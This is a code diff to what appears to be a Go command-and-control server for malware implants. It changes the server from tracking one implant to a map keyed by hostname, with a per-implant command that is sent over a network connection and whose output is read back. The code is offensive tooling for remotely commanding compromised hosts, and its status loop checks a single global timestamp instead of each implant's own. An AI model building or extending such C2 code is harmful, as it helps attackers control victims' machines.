@@ -8,13 +8,14 @@ import (
 	"time"
 )
 
-type implantID struct {
+type Implant struct {
 	Hostname string
 	LastSeen time.Time
 	Active   bool
+	Command  string
 }
 
-var implant implantID
+var implants = make(map[string]*Implant)
 
 var lastSeen time.Time
 
@@ -41,10 +42,12 @@ func checkImplantStatus() {
 
 	for {
 		time.Sleep(10 * time.Second)
-		if time.Since(lastSeen) > 30*time.Second {
-			implant.Active = false
-		} else {
-			implant.Active = true
+		for _, implant := range implants {
+			if time.Since(lastSeen) > 30*time.Second {
+				implant.Active = false
+			} else {
+				implant.Active = true
+			}
 		}
 	}
 }
@@ -62,15 +65,15 @@ func handleImplants(conn net.Conn) {
 	defer conn.Close()
 	reader := bufio.NewReader(conn)
 	hostname := GetHostname(reader)
-	implant = implantID{
-		Hostname: hostname,
-		LastSeen: time.Now(),
-		Active:   true,
+	if _, exists := implants[hostname]; !exists { // looks up hostname checks if it exsists if it doesnt create new and store it
+		implants[hostname] = &Implant{}
 	}
-
-	if pendingCommand != "" {
-		sendCommands(conn)
-		pendingCommand = ""
+	implants[hostname].Hostname = hostname
+	implants[hostname].LastSeen = time.Now()
+	implants[hostname].Active = true
+	if implants[hostname].Command != "" {
+		sendCommands(conn, implants[hostname].Command)
+		implants[hostname].Command = ""
 		receiveOutput(reader)
 	}
 }
